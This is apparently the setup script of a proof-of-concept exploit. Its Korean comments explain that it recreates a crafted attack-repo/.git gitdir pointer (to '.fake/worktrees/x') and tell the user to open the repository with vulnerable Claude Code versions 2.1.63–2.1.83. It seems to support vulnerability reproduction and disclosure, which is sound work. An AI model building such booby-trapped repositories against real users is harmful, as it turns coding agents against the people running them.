#!/usr/bin/env bash
# git 은 ".git" 이라는 이름의 파일을 저장소에 담지 못한다.
# 따라서 clone 후 이 스크립트로 attack-repo/.git (gitdir 포인터) 를 재생성한다.
set -euo pipefail
cd "$(dirname "$0")"
printf 'gitdir: .fake/worktrees/x\n' > attack-repo/.git
echo "[+] attack-repo/.git 생성 완료."
echo "[+] 이제 취약 버전(2.1.63~2.1.83) Claude Code 로 attack-repo 를 여세요."
